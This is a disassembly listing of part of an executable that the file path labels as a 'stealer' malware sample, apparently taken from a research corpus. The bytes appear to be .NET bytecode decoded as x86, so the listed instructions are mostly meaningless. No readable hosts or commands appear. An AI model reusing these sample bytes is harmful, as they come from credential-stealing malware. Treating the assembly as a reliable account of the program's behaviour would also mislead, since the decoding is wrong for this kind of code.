
malware_samples/stealer/f6a02666b49de9f444eef5d3ed6d810e8fd4e1251913db7c03f134478eb56efa.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	eb 91                	jmp    0x401f93
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 84 44 00    	add    %al,0x448400
  402013:	00 e0                	add    %ah,%al
  402015:	4b                   	dec    %ebx
  402016:	00 00                	add    %al,(%eax)
  402018:	03 00                	add    (%eax),%eax
  40201a:	02 00                	add    (%eax),%al
  40201c:	0a 00                	or     (%eax),%al
  40201e:	00 06                	add    %al,(%esi)
  402020:	64 90                	fs nop
  402022:	00 00                	add    %al,(%eax)
  402024:	b8 00 00 00 00       	mov    $0x0,%eax
	...
  40204d:	00 00                	add    %al,(%eax)
  40204f:	00 1e                	add    %bl,(%esi)
  402051:	02 7b 17             	add    0x17(%ebx),%bh
  402054:	00 00                	add    %al,(%eax)
  402056:	0a 2a                	or     (%edx),%ch
  402058:	1e                   	push   %ds
  402059:	02 7b 18             	add    0x18(%ebx),%bh
  40205c:	00 00                	add    %al,(%eax)
  40205e:	0a 2a                	or     (%edx),%ch
  402060:	1e                   	push   %ds
  402061:	02 7b 19             	add    0x19(%ebx),%bh
  402064:	00 00                	add    %al,(%eax)
  402066:	0a 2a                	or     (%edx),%ch
  402068:	72 02                	jb     0x40206c
  40206a:	28 1a                	sub    %bl,(%edx)
  40206c:	00 00                	add    %al,(%eax)
  40206e:	0a 02                	or     (%edx),%al
  402070:	03 7d 17             	add    0x17(%ebp),%edi
  402073:	00 00                	add    %al,(%eax)
  402075:	0a 02                	or     (%edx),%al
  402077:	04 7d                	add    $0x7d,%al
  402079:	18 00                	sbb    %al,(%eax)
  40207b:	00 0a                	add    %cl,(%edx)
  40207d:	02 05 7d 19 00 00    	add    0x197d,%al
  402083:	0a 2a                	or     (%edx),%ch
  402085:	00 00                	add    %al,(%eax)
  402087:	00 13                	add    %dl,(%ebx)
  402089:	30 03                	xor    %al,(%ebx)
  40208b:	00 5b 00             	add    %bl,0x0(%ebx)
  40208e:	00 00                	add    %al,(%eax)
  402090:	01 00                	add    %eax,(%eax)
  402092:	00 11                	add    %dl,(%ecx)
  402094:	03 75 01             	add    0x1(%ebp),%esi
  402097:	00 00                	add    %al,(%eax)
  402099:	1b 0a                	sbb    (%edx),%ecx
  40209b:	02 06                	add    (%esi),%al
  40209d:	2e 4e                	cs dec %esi
  40209f:	06                   	push   %es
  4020a0:	2c 48                	sub    $0x48,%al
  4020a2:	28 1b                	sub    %bl,(%ebx)
  4020a4:	00 00                	add    %al,(%eax)
  4020a6:	0a 02                	or     (%edx),%al
  4020a8:	7b 17                	jnp    0x4020c1
  4020aa:	00 00                	add    %al,(%eax)
  4020ac:	0a 06                	or     (%esi),%al
  4020ae:	7b 17                	jnp    0x4020c7
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	0a 6f 1c             	or     0x1c(%edi),%ch
  4020b5:	00 00                	add    %al,(%eax)
  4020b7:	0a 2c 30             	or     (%eax,%esi,1),%ch
  4020ba:	28 1d 00 00 0a 02    	sub    %bl,0x20a0000
  4020c0:	7b 18                	jnp    0x4020da
  4020c2:	00 00                	add    %al,(%eax)
  4020c4:	0a 06                	or     (%esi),%al
  4020c6:	7b 18                	jnp    0x4020e0
  4020c8:	00 00                	add    %al,(%eax)
  4020ca:	0a 6f 1e             	or     0x1e(%edi),%ch
  4020cd:	00 00                	add    %al,(%eax)
  4020cf:	0a 2c 18             	or     (%eax,%ebx,1),%ch
  4020d2:	28 1f                	sub    %bl,(%edi)
  4020d4:	00 00                	add    %al,(%eax)
  4020d6:	0a 02                	or     (%edx),%al
  4020d8:	7b 19                	jnp    0x4020f3
  4020da:	00 00                	add    %al,(%eax)
  4020dc:	0a 06                	or     (%esi),%al
  4020de:	7b 19                	jnp    0x4020f9
  4020e0:	00 00                	add    %al,(%eax)
  4020e2:	0a 6f 20             	or     0x20(%edi),%ch
  4020e5:	00 00                	add    %al,(%eax)
  4020e7:	0a 2b                	or     (%ebx),%ch
  4020e9:	01 16                	add    %edx,(%esi)
  4020eb:	2b 01                	sub    (%ecx),%eax
  4020ed:	17                   	pop    %ss
  4020ee:	2a 00                	sub    (%eax),%al
  4020f0:	13 30                	adc    (%eax),%esi
  4020f2:	03 00                	add    (%eax),%eax
  4020f4:	4b                   	dec    %ebx
  4020f5:	00 00                	add    %al,(%eax)
  4020f7:	00 00                	add    %al,(%eax)
  4020f9:	00 00                	add    %al,(%eax)
  4020fb:	00 20                	add    %ah,(%eax)
  4020fd:	8e b9 0c e6 20 29    	mov    0x2920e60c(%ecx),%?
  402103:	55                   	push   %ebp
  402104:	55                   	push   %ebp
  402105:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402106:	5a                   	pop    %edx
  402107:	28 1b                	sub    %bl,(%ebx)
  402109:	00 00                	add    %al,(%eax)
  40210b:	0a 02                	or     (%edx),%al
  40210d:	7b 17                	jnp    0x402126
  40210f:	00 00                	add    %al,(%eax)
  402111:	0a 6f 21             	or     0x21(%edi),%ch
  402114:	00 00                	add    %al,(%eax)
  402116:	0a 58 20             	or     0x20(%eax),%bl
  402119:	29 55 55             	sub    %edx,0x55(%ebp)
  40211c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40211d:	5a                   	pop    %edx
  40211e:	28 1d 00 00 0a 02    	sub    %bl,0x20a0000
  402124:	7b 18                	jnp    0x40213e
  402126:	00 00                	add    %al,(%eax)
  402128:	0a 6f 22             	or     0x22(%edi),%ch
  40212b:	00 00                	add    %al,(%eax)
  40212d:	0a 58 20             	or     0x20(%eax),%bl
  402130:	29 55 55             	sub    %edx,0x55(%ebp)
  402133:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402134:	5a                   	pop    %edx
  402135:	28 1f                	sub    %bl,(%edi)
  402137:	00 00                	add    %al,(%eax)
  402139:	0a 02                	or     (%edx),%al
  40213b:	7b 19                	jnp    0x402156
  40213d:	00 00                	add    %al,(%eax)
  40213f:	0a 6f 23             	or     0x23(%edi),%ch
  402142:	00 00                	add    %al,(%eax)
  402144:	0a 58 2a             	or     0x2a(%eax),%bl
  402147:	00 13                	add    %dl,(%ebx)
  402149:	30 07                	xor    %al,(%edi)
  40214b:	00 8a 00 00 00 02    	add    %cl,0x2000000(%edx)
  402151:	00 00                	add    %al,(%eax)
  402153:	11 14 72             	adc    %edx,(%edx,%esi,2)
  402156:	01 00                	add    %eax,(%eax)
  402158:	00 70 19             	add    %dh,0x19(%eax)
  40215b:	8d 12                	lea    (%edx),%edx
  40215d:	00 00                	add    %al,(%eax)
  40215f:	01 25 16 02 7b 17    	add    %esp,0x177b0216
  402165:	00 00                	add    %al,(%eax)
  402167:	0a 0a                	or     (%edx),%cl
  402169:	12 00                	adc    (%eax),%al
  40216b:	25 71 05 00 00       	and    $0x571,%eax
  402170:	1b 8c 05 00 00 1b 2d 	sbb    0x2d1b0000(%ebp,%eax,1),%ecx
  402177:	04 26                	add    $0x26,%al
  402179:	14 2b                	adc    $0x2b,%al
  40217b:	0b fe                	or     %esi,%edi
  40217d:	16                   	push   %ss
  40217e:	05 00 00 1b 6f       	add    $0x6f1b0000,%eax
  402183:	24 00                	and    $0x0,%al
  402185:	00 0a                	add    %cl,(%edx)
  402187:	a2 25 17 02 7b       	mov    %al,0x7b021725
  40218c:	18 00                	sbb    %al,(%eax)
  40218e:	00 0a                	add    %cl,(%edx)
  402190:	0b 12                	or     (%edx),%edx
  402192:	01 25 71 06 00 00    	add    %esp,0x671
  402198:	1b 8c 06 00 00 1b 2d 	sbb    0x2d1b0000(%esi,%eax,1),%ecx
  40219f:	04 26                	add    $0x26,%al
  4021a1:	14 2b                	adc    $0x2b,%al
  4021a3:	0b fe                	or     %esi,%edi
  4021a5:	16                   	push   %ss
  4021a6:	06                   	push   %es
  4021a7:	00 00                	add    %al,(%eax)
  4021a9:	1b 6f 24             	sbb    0x24(%edi),%ebp
  4021ac:	00 00                	add    %al,(%eax)
  4021ae:	0a a2 25 18 02 7b    	or     0x7b021825(%edx),%ah
  4021b4:	19 00                	sbb    %eax,(%eax)
  4021b6:	00 0a                	add    %cl,(%edx)
  4021b8:	0c 12                	or     $0x12,%al
  4021ba:	02 25 71 07 00 00    	add    0x771,%ah
  4021c0:	1b 8c 07 00 00 1b 2d 	sbb    0x2d1b0000(%edi,%eax,1),%ecx
  4021c7:	04 26                	add    $0x26,%al
  4021c9:	14 2b                	adc    $0x2b,%al
  4021cb:	0b fe                	or     %esi,%edi
  4021cd:	16                   	push   %ss
  4021ce:	07                   	pop    %es
  4021cf:	00 00                	add    %al,(%eax)
  4021d1:	1b 6f 24             	sbb    0x24(%edi),%ebp
  4021d4:	00 00                	add    %al,(%eax)
  4021d6:	0a a2 28 25 00 00    	or     0x2528(%edx),%ah
  4021dc:	0a 2a                	or     (%edx),%ch
  4021de:	00 00                	add    %al,(%eax)
  4021e0:	13 30                	adc    (%eax),%esi
  4021e2:	02 00                	add    (%eax),%al
  4021e4:	49                   	dec    %ecx
  4021e5:	00 00                	add    %al,(%eax)
  4021e7:	00 03                	add    %al,(%ebx)
  4021e9:	00 00                	add    %al,(%eax)
  4021eb:	11 00                	adc    %eax,(%eax)
  4021ed:	28 08                	sub    %cl,(%eax)
  4021ef:	00 00                	add    %al,(%eax)
  4021f1:	06                   	push   %es
  4021f2:	0a 06                	or     (%esi),%al
  4021f4:	16                   	push   %ss
  4021f5:	28 09                	sub    %cl,(%ecx)
  4021f7:	00 00                	add    %al,(%eax)
  4021f9:	06                   	push   %es
  4021fa:	26 28 0b             	sub    %cl,%es:(%ebx)
  4021fd:	00 00                	add    %al,(%eax)
  4021ff:	06                   	push   %es
  402200:	0b 28                	or     (%eax),%ebp
  402202:	26 00 00             	add    %al,%es:(%eax)
  402205:	0a 00                	or     (%eax),%al
  402207:	16                   	push   %ss
  402208:	28 27                	sub    %ah,(%edi)
  40220a:	00 00                	add    %al,(%eax)
  40220c:	0a 00                	or     (%eax),%al
  40220e:	73 11                	jae    0x402221
  402210:	00 00                	add    %al,(%eax)
  402212:	06                   	push   %es
  402213:	0c 07                	or     $0x7,%al
  402215:	0d 09 2c 0b 00       	or     $0xb2c09,%eax
  40221a:	08 6f 12             	or     %ch,0x12(%edi)
  40221d:	00 00                	add    %al,(%eax)
  40221f:	06                   	push   %es
  402220:	00 00                	add    %al,(%eax)
  402222:	2b 09                	sub    (%ecx),%ecx
  402224:	00 08                	add    %cl,(%eax)
  402226:	6f                   	outsl  %ds:(%esi),(%dx)
  402227:	1a 00                	sbb    (%eax),%al
  402229:	00 06                	add    %al,(%esi)
  40222b:	00 00                	add    %al,(%eax)
  40222d:	08 28                	or     %ch,(%eax)
  40222f:	28 00                	sub    %al,(%eax)
  402231:	00 0a                	add    %cl,(%edx)
  402233:	00 2a                	add    %ch,(%edx)
  402235:	00 00                	add    %al,(%eax)
  402237:	00 1b                	add    %bl,(%ebx)
  402239:	30 03                	xor    %al,(%ebx)
  40223b:	00 67 00             	add    %ah,0x0(%edi)
  40223e:	00 00                	add    %al,(%eax)
  402240:	04 00                	add    $0x0,%al
  402242:	00 11                	add    %dl,(%ecx)
  402244:	00 00                	add    %al,(%eax)
  402246:	7e 29                	jle    0x402271
  402248:	00 00                	add    %al,(%eax)
  40224a:	0a 72 65             	or     0x65(%edx),%dh
  40224d:	00 00                	add    %al,(%eax)
  40224f:	70 6f                	jo     0x4022c0
  402251:	2a 00                	sub    (%eax),%al
  402253:	00 0a                	add    %cl,(%edx)
  402255:	0a 00                	or     (%eax),%al
  402257:	06                   	push   %es
  402258:	14 fe                	adc    $0xfe,%al
  40225a:	01 0b                	add    %ecx,(%ebx)
  40225c:	07                   	pop    %es
  40225d:	2c 35                	sub    $0x35,%al
  40225f:	00 7e 29             	add    %bh,0x29(%esi)
  402262:	00 00                	add    %al,(%eax)
  402264:	0a 72 65             	or     0x65(%edx),%dh
  402267:	00 00                	add    %al,(%eax)
  402269:	70 6f                	jo     0x4022da
  40226b:	2b 00                	sub    (%eax),%eax
  40226d:	00 0a                	add    %cl,(%edx)
  40226f:	0c 00                	or     $0x0,%al
  402271:	08 72 8d             	or     %dh,-0x73(%edx)
  402274:	00 00                	add    %al,(%eax)
  402276:	70 72                	jo     0x4022ea
  402278:	a1 00 00 70 6f       	mov    0x6f700000,%eax
  40227d:	2c 00                	sub    $0x0,%al
  40227f:	00 0a                	add    %cl,(%edx)
  402281:	00 00                	add    %al,(%eax)
  402283:	de 0b                	fimuls (%ebx)
  402285:	08 2c 07             	or     %ch,(%edi,%eax,1)
  402288:	08 6f 2d             	or     %ch,0x2d(%edi)
  40228b:	00 00                	add    %al,(%eax)
  40228d:	0a 00                	or     (%eax),%al
  40228f:	dc 17                	fcoml  (%edi)
  402291:	0d de 15 16 0d       	or     $0xd1615de,%eax
  402296:	de 11                	ficoms (%ecx)
  402298:	06                   	push   %es
  402299:	2c 07                	sub    $0x7,%al
  40229b:	06                   	push   %es
  40229c:	6f                   	outsl  %ds:(%esi),(%dx)
  40229d:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4022a2:	dc 26                	fsubl  (%esi)
  4022a4:	00 17                	add    %dl,(%edi)
  4022a6:	0d de 00 09 2a       	or     $0x2a0900de,%eax
  4022ab:	00 01                	add    %al,(%ecx)
  4022ad:	28 00                	sub    %al,(%eax)
  4022af:	00 02                	add    %al,(%edx)
  4022b1:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4022b4:	15 41 00 0b 00       	adc    $0xb0041,%eax
  4022b9:	00 00                	add    %al,(%eax)
  4022bb:	00 02                	add    %al,(%edx)
  4022bd:	00 12                	add    %dl,(%edx)
  4022bf:	00 42 54             	add    %al,0x54(%edx)
  4022c2:	00 0b                	add    %cl,(%ebx)
  4022c4:	00 00                	add    %al,(%eax)
  4022c6:	00 00                	add    %al,(%eax)
  4022c8:	00 00                	add    %al,(%eax)
  4022ca:	01 00                	add    %eax,(%eax)
  4022cc:	5e                   	pop    %esi
  4022cd:	5f                   	pop    %edi
  4022ce:	00 06                	add    %al,(%esi)
  4022d0:	12 00                	adc    (%eax),%al
  4022d2:	00 01                	add    %al,(%ecx)
  4022d4:	13 30                	adc    (%eax),%esi
  4022d6:	02 00                	add    (%eax),%al
  4022d8:	5f                   	pop    %edi
  4022d9:	00 00                	add    %al,(%eax)
  4022db:	00 00                	add    %al,(%eax)
  4022dd:	00 00                	add    %al,(%eax)
  4022df:	00 02                	add    %al,(%edx)
  4022e1:	73 2e                	jae    0x402311
  4022e3:	00 00                	add    %al,(%eax)
  4022e5:	0a 7d 0a             	or     0xa(%ebp),%bh
  4022e8:	00 00                	add    %al,(%eax)
  4022ea:	04 02                	add    $0x2,%al
  4022ec:	28 2f                	sub    %ch,(%edi)
  4022ee:	00 00                	add    %al,(%eax)
  4022f0:	0a 7d 0b             	or     0xb(%ebp),%bh
  4022f3:	00 00                	add    %al,(%eax)
  4022f5:	04 02                	add    $0x2,%al
  4022f7:	28 2f                	sub    %ch,(%edi)
  4022f9:	00 00                	add    %al,(%eax)
  4022fb:	0a 28                	or     (%eax),%ch
  4022fd:	30 00                	xor    %al,(%eax)
  4022ff:	00 0a                	add    %cl,(%edx)
  402301:	7d 0c                	jge    0x40230f
  402303:	00 00                	add    %al,(%eax)
  402305:	04 02                	add    $0x2,%al
  402307:	28 31                	sub    %dh,(%ecx)
  402309:	00 00                	add    %al,(%eax)
  40230b:	0a 00                	or     (%eax),%al
  40230d:	00 02                	add    %al,(%edx)
  40230f:	17                   	pop    %ss
  402310:	28 32                	sub    %dh,(%edx)
  402312:	00 00                	add    %al,(%eax)
  402314:	0a 00                	or     (%eax),%al
  402316:	02 16                	add    (%esi),%dl
  402318:	28 33                	sub    %dh,(%ebx)
  40231a:	00 00                	add    %al,(%eax)
  40231c:	0a 00                	or     (%eax),%al
  40231e:	02 23                	add    (%ebx),%ah
	...
  402328:	28 34 00             	sub    %dh,(%eax,%eax,1)
  40232b:	00 0a                	add    %cl,(%edx)
  40232d:	00 02                	add    %al,(%edx)
  40232f:	16                   	push   %ss
  402330:	28 35 00 00 0a 00    	sub    %dh,0xa0000
  402336:	02 17                	add    (%edi),%dl
  402338:	28 36                	sub    %dh,(%esi)
  40233a:	00 00                	add    %al,(%eax)
  40233c:	0a 00                	or     (%eax),%al
  40233e:	2a 00                	sub    (%eax),%al
  402340:	1b 30                	sbb    (%eax),%esi
  402342:	02 00                	add    (%eax),%al
  402344:	45                   	inc    %ebp
	...
  40234d:	00 02                	add    %al,(%edx)
  40234f:	28 1b                	sub    %bl,(%ebx)
  402351:	00 00                	add    %al,(%eax)
  402353:	06                   	push   %es
  402354:	00 02                	add    %al,(%edx)
  402356:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402359:	00 06                	add    %al,(%esi)
  40235b:	00 02                	add    %al,(%edx)
  40235d:	28 13                	sub    %dl,(%ebx)
  40235f:	00 00                	add    %al,(%eax)
  402361:	06                   	push   %es
  402362:	00 02                	add    %al,(%edx)
  402364:	72 ab                	jb     0x402311
  402366:	00 00                	add    %al,(%eax)
  402368:	70 28                	jo     0x402392
  40236a:	30 00                	xor    %al,(%eax)
  40236c:	00 06                	add    %al,(%esi)
  40236e:	00 20                	add    %ah,(%eax)
  402370:	d0 07                	rolb   $1,(%edi)
  402372:	00 00                	add    %al,(%eax)
  402374:	28 37                	sub    %dh,(%edi)
  402376:	00 00                	add    %al,(%eax)
  402378:	0a 00                	or     (%eax),%al
  40237a:	02 28                	add    (%eax),%ch
  40237c:	34 00                	xor    $0x0,%al
  40237e:	00 06                	add    %al,(%esi)
  402380:	00 00                	add    %al,(%eax)
  402382:	de 0c 26             	fimuls (%esi,%eiz,1)
  402385:	00 02                	add    %al,(%edx)
  402387:	28 34 00             	sub    %dh,(%eax,%eax,1)
  40238a:	00 06                	add    %al,(%esi)
  40238c:	00 00                	add    %al,(%eax)
  40238e:	de 00                	fiadds (%eax)
  402390:	2a 00                	sub    (%eax),%al
  402392:	00 00                	add    %al,(%eax)
  402394:	01 10                	add    %edx,(%eax)
  402396:	00 00                	add    %al,(%eax)
  402398:	00 00                	add    %al,(%eax)
  40239a:	01 00                	add    %eax,(%eax)
  40239c:	37                   	aaa
  40239d:	38 00                	cmp    %al,(%eax)
  40239f:	0c 12                	or     $0x12,%al
  4023a1:	00 00                	add    %al,(%eax)
  4023a3:	01 1b                	add    %ebx,(%ebx)
  4023a5:	30 05 00 3b 0a 00    	xor    %al,0xa3b00
  4023ab:	00 05 00 00 11 00    	add    %al,0x110000
  4023b1:	00 7e 29             	add    %bh,0x29(%esi)
  4023b4:	00 00                	add    %al,(%eax)
  4023b6:	0a 72 fb             	or     -0x5(%edx),%dh
  4023b9:	00 00                	add    %al,(%eax)
  4023bb:	70 17                	jo     0x4023d4
  4023bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4023be:	38 00                	cmp    %al,(%eax)
  4023c0:	00 0a                	add    %cl,(%edx)
  4023c2:	13 09                	adc    (%ecx),%ecx
  4023c4:	00 11                	add    %dl,(%ecx)
  4023c6:	09 14 fe             	or     %edx,(%esi,%edi,8)
  4023c9:	03 13                	add    (%ebx),%edx
  4023cb:	0a 11                	or     (%ecx),%dl
  4023cd:	0a 2c 13             	or     (%ebx,%edx,1),%ch
  4023d0:	11 09                	adc    %ecx,(%ecx)
  4023d2:	72 57                	jb     0x40242b
  4023d4:	01 00                	add    %eax,(%eax)
  4023d6:	70 02                	jo     0x4023da
  4023d8:	7b 0b                	jnp    0x4023e5
  4023da:	00 00                	add    %al,(%eax)
  4023dc:	04 6f                	add    $0x6f,%al
  4023de:	2c 00                	sub    $0x0,%al
  4023e0:	00 0a                	add    %cl,(%edx)
  4023e2:	00 00                	add    %al,(%eax)
  4023e4:	de 0d 11 09 2c 08    	fimuls 0x82c0911
  4023ea:	11 09                	adc    %ecx,(%ecx)
  4023ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4023ed:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4023f2:	dc 7e 39             	fdivrl 0x39(%esi)
  4023f5:	00 00                	add    %al,(%eax)
  4023f7:	0a 72 fb             	or     -0x5(%edx),%dh
  4023fa:	00 00                	add    %al,(%eax)
  4023fc:	70 17                	jo     0x402415
  4023fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4023ff:	38 00                	cmp    %al,(%eax)
  402401:	00 0a                	add    %cl,(%edx)
  402403:	13 0b                	adc    (%ebx),%ecx
  402405:	00 11                	add    %dl,(%ecx)
  402407:	0b 14 fe             	or     (%esi,%edi,8),%edx
  40240a:	03 13                	add    (%ebx),%edx
  40240c:	0c 11                	or     $0x11,%al
  40240e:	0c 2c                	or     $0x2c,%al
  402410:	13 11                	adc    (%ecx),%edx
  402412:	0b 72 57             	or     0x57(%edx),%esi
  402415:	01 00                	add    %eax,(%eax)
  402417:	70 02                	jo     0x40241b
  402419:	7b 0b                	jnp    0x402426
  40241b:	00 00                	add    %al,(%eax)
  40241d:	04 6f                	add    $0x6f,%al
  40241f:	2c 00                	sub    $0x0,%al
  402421:	00 0a                	add    %cl,(%edx)
  402423:	00 00                	add    %al,(%eax)
  402425:	de 0d 11 0b 2c 08    	fimuls 0x82c0b11
  40242b:	11 0b                	adc    %ecx,(%ebx)
  40242d:	6f                   	outsl  %ds:(%esi),(%dx)
  40242e:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402433:	dc 7e 29             	fdivrl 0x29(%esi)
  402436:	00 00                	add    %al,(%eax)
  402438:	0a 72 6d             	or     0x6d(%edx),%dh
  40243b:	01 00                	add    %eax,(%eax)
  40243d:	70 17                	jo     0x402456
  40243f:	6f                   	outsl  %ds:(%esi),(%dx)
  402440:	38 00                	cmp    %al,(%eax)
  402442:	00 0a                	add    %cl,(%edx)
  402444:	13 0d 00 11 0d 14    	adc    0x140d1100,%ecx
  40244a:	fe 03                	incb   (%ebx)
  40244c:	13 0e                	adc    (%esi),%ecx
  40244e:	11 0e                	adc    %ecx,(%esi)
  402450:	2c 13                	sub    $0x13,%al
  402452:	11 0d 72 57 01 00    	adc    %ecx,0x15772
  402458:	70 02                	jo     0x40245c
  40245a:	7b 0b                	jnp    0x402467
  40245c:	00 00                	add    %al,(%eax)
  40245e:	04 6f                	add    $0x6f,%al
  402460:	2c 00                	sub    $0x0,%al
  402462:	00 0a                	add    %cl,(%edx)
  402464:	00 00                	add    %al,(%eax)
  402466:	de 0d 11 0d 2c 08    	fimuls 0x82c0d11
  40246c:	11 0d 6f 2d 00 00    	adc    %ecx,0x2d6f
  402472:	0a 00                	or     (%eax),%al
  402474:	dc 7e 39             	fdivrl 0x39(%esi)
  402477:	00 00                	add    %al,(%eax)
  402479:	0a 72 6d             	or     0x6d(%edx),%dh
  40247c:	01 00                	add    %eax,(%eax)
  40247e:	70 17                	jo     0x402497
  402480:	6f                   	outsl  %ds:(%esi),(%dx)
  402481:	38 00                	cmp    %al,(%eax)
  402483:	00 0a                	add    %cl,(%edx)
  402485:	13 0f                	adc    (%edi),%ecx
  402487:	00 11                	add    %dl,(%ecx)
  402489:	0f 14 fe             	unpcklps %xmm6,%xmm7
  40248c:	03 13                	add    (%ebx),%edx
  40248e:	10 11                	adc    %dl,(%ecx)
  402490:	10 2c 13             	adc    %ch,(%ebx,%edx,1)
  402493:	11 0f                	adc    %ecx,(%edi)
  402495:	72 57                	jb     0x4024ee
  402497:	01 00                	add    %eax,(%eax)
  402499:	70 02                	jo     0x40249d
  40249b:	7b 0b                	jnp    0x4024a8
  40249d:	00 00                	add    %al,(%eax)
  40249f:	04 6f                	add    $0x6f,%al
  4024a1:	2c 00                	sub    $0x0,%al
  4024a3:	00 0a                	add    %cl,(%edx)
  4024a5:	00 00                	add    %al,(%eax)
  4024a7:	de 0d 11 0f 2c 08    	fimuls 0x82c0f11
  4024ad:	11 0f                	adc    %ecx,(%edi)
  4024af:	6f                   	outsl  %ds:(%esi),(%dx)
  4024b0:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4024b5:	dc 7e 29             	fdivrl 0x29(%esi)
  4024b8:	00 00                	add    %al,(%eax)
  4024ba:	0a 72 d1             	or     -0x2f(%edx),%dh
  4024bd:	01 00                	add    %eax,(%eax)
  4024bf:	70 17                	jo     0x4024d8
  4024c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4024c2:	38 00                	cmp    %al,(%eax)
  4024c4:	00 0a                	add    %cl,(%edx)
  4024c6:	13 11                	adc    (%ecx),%edx
  4024c8:	00 11                	add    %dl,(%ecx)
  4024ca:	11 14 fe             	adc    %edx,(%esi,%edi,8)
  4024cd:	01 13                	add    %edx,(%ebx)
  4024cf:	12 11                	adc    (%ecx),%dl
  4024d1:	12 2c 10             	adc    (%eax,%edx,1),%ch
  4024d4:	7e 29                	jle    0x4024ff
  4024d6:	00 00                	add    %al,(%eax)
  4024d8:	0a 72 d1             	or     -0x2f(%edx),%dh
  4024db:	01 00                	add    %eax,(%eax)
  4024dd:	70 6f                	jo     0x40254e
  4024df:	2b 00                	sub    (%eax),%eax
  4024e1:	00 0a                	add    %cl,(%edx)
  4024e3:	26 7e 29             	es jle 0x40250f
  4024e6:	00 00                	add    %al,(%eax)
  4024e8:	0a 72 d1             	or     -0x2f(%edx),%dh
  4024eb:	01 00                	add    %eax,(%eax)
  4024ed:	70 17                	jo     0x402506
  4024ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4024f0:	38 00                	cmp    %al,(%eax)
  4024f2:	00 0a                	add    %cl,(%edx)
  4024f4:	13 13                	adc    (%ebx),%edx
  4024f6:	00 11                	add    %dl,(%ecx)
  4024f8:	13 72 57             	adc    0x57(%edx),%esi
  4024fb:	01 00                	add    %eax,(%eax)
  4024fd:	70 02                	jo     0x402501
  4024ff:	7b 0b                	jnp    0x40250c
  402501:	00 00                	add    %al,(%eax)
  402503:	04 6f                	add    $0x6f,%al
  402505:	2c 00                	sub    $0x0,%al
  402507:	00 0a                	add    %cl,(%edx)
  402509:	00 00                	add    %al,(%eax)
  40250b:	de 0d 11 13 2c 08    	fimuls 0x82c1311
  402511:	11 13                	adc    %edx,(%ebx)
  402513:	6f                   	outsl  %ds:(%esi),(%dx)
  402514:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402519:	dc 00                	faddl  (%eax)
  40251b:	de 0d 11 11 2c 08    	fimuls 0x82c1111
  402521:	11 11                	adc    %edx,(%ecx)
  402523:	6f                   	outsl  %ds:(%esi),(%dx)
  402524:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402529:	dc 7e 39             	fdivrl 0x39(%esi)
  40252c:	00 00                	add    %al,(%eax)
  40252e:	0a 72 d1             	or     -0x2f(%edx),%dh
  402531:	01 00                	add    %eax,(%eax)
  402533:	70 17                	jo     0x40254c
  402535:	6f                   	outsl  %ds:(%esi),(%dx)
  402536:	38 00                	cmp    %al,(%eax)
  402538:	00 0a                	add    %cl,(%edx)
  40253a:	13 14 00             	adc    (%eax,%eax,1),%edx
  40253d:	11 14 14             	adc    %edx,(%esp,%edx,1)
  402540:	fe 01                	incb   (%ecx)
  402542:	13 15 11 15 2c 10    	adc    0x102c1511,%edx
  402548:	7e 39                	jle    0x402583
  40254a:	00 00                	add    %al,(%eax)
  40254c:	0a 72 d1             	or     -0x2f(%edx),%dh
  40254f:	01 00                	add    %eax,(%eax)
  402551:	70 6f                	jo     0x4025c2
  402553:	2b 00                	sub    (%eax),%eax
  402555:	00 0a                	add    %cl,(%edx)
  402557:	26 7e 39             	es jle 0x402593
  40255a:	00 00                	add    %al,(%eax)
  40255c:	0a 72 d1             	or     -0x2f(%edx),%dh
  40255f:	01 00                	add    %eax,(%eax)
  402561:	70 17                	jo     0x40257a
  402563:	6f                   	outsl  %ds:(%esi),(%dx)
  402564:	38 00                	cmp    %al,(%eax)
  402566:	00 0a                	add    %cl,(%edx)
  402568:	13 16                	adc    (%esi),%edx
  40256a:	00 11                	add    %dl,(%ecx)
  40256c:	16                   	push   %ss
  40256d:	72 57                	jb     0x4025c6
  40256f:	01 00                	add    %eax,(%eax)
  402571:	70 02                	jo     0x402575
  402573:	7b 0b                	jnp    0x402580
  402575:	00 00                	add    %al,(%eax)
  402577:	04 6f                	add    $0x6f,%al
  402579:	2c 00                	sub    $0x0,%al
  40257b:	00 0a                	add    %cl,(%edx)
  40257d:	00 00                	add    %al,(%eax)
  40257f:	de 0d 11 16 2c 08    	fimuls 0x82c1611
  402585:	11 16                	adc    %edx,(%esi)
  402587:	6f                   	outsl  %ds:(%esi),(%dx)
  402588:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40258d:	dc 00                	faddl  (%eax)
  40258f:	de 0d 11 14 2c 08    	fimuls 0x82c1411
  402595:	11 14 6f             	adc    %edx,(%edi,%ebp,2)
  402598:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40259d:	dc 7e 39             	fdivrl 0x39(%esi)
  4025a0:	00 00                	add    %al,(%eax)
  4025a2:	0a 72 3d             	or     0x3d(%edx),%dh
  4025a5:	02 00                	add    (%eax),%al
  4025a7:	70 17                	jo     0x4025c0
  4025a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4025aa:	38 00                	cmp    %al,(%eax)
  4025ac:	00 0a                	add    %cl,(%edx)
  4025ae:	13 17                	adc    (%edi),%edx
  4025b0:	00 11                	add    %dl,(%ecx)
  4025b2:	17                   	pop    %ss
  4025b3:	72 a9                	jb     0x40255e
  4025b5:	02 00                	add    (%eax),%al
  4025b7:	70 72                	jo     0x40262b
